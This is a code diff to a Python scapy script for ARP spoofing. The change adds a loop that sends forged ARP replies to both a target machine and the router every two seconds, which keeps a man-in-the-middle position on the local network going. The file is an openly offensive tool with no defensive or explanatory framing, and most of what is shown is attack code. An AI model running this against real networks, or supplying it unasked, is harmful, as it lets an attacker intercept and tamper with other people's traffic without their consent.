@@ -2,11 +2,12 @@
 
 import scapy.all as scapy
 import argparse
+import time
 
 def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target", help="Target IP address")
-    parser.add_argument("-s", "--spoof", dest="spoof", help="Spoof IP address")
+    parser.add_argument("-s", "--spoof", dest="spoof", help="Spoof IP address (router address)")
     options = parser.parse_args()
     if not options.target:
         parser.error("[-] Please specify a target IP address")
@@ -29,4 +30,7 @@ def spoof(target, spoof):
     scapy.send(packet)
 
 options = get_arguments()
-spoof(options.target, options.spoof)
+while True:
+    spoof(options.target, options.spoof)
+    spoof(options.spoof,options.target)
+    time.sleep(2)
